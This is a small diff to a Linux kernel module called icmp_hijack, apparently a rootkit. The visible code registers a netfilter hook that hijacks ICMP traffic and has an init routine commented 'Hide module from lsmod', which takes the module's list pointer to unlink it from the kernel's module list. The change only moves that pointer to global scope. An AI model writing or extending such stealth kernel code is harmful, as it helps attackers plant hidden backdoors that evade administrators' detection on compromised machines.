@@ -242,10 +242,10 @@ unsigned int icmp_hijack(void *priv, struct sk_buff *skb, const struct nf_hook_s
 }
 
 // Module initialization
+struct list_head *mod_list;
 static int __init init_icmp_hijack(void) {
 
     // Hide module from lsmod
-    struct list_head *mod_list;
     mod_list = THIS_MODULE->list.prev;
     #ifdef DEBUG_K
         printk(KERN_INFO "Hiding module from list\n");
